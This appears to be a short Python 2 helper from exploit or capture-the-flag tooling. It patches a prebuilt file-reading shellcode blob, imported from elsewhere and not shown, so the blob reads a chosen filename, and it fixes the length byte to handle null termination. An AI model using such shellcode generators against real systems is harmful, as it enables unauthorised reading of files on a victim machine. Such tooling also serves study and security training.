from readfile_shellcode import readfile_shellcode

def readfile(filename):
	import struct
	if(len(filename) > 127):
		import sys
		print "FILENAME TOO LONG"
		sys.exit(1)
	patch_null = "\x88\x66" + struct.pack("<b", len(filename))
	filename = filename + "|"
	return (readfile_shellcode[:-(len("readfile.s|"))] + filename).replace("\x88\x66\x10", patch_null)

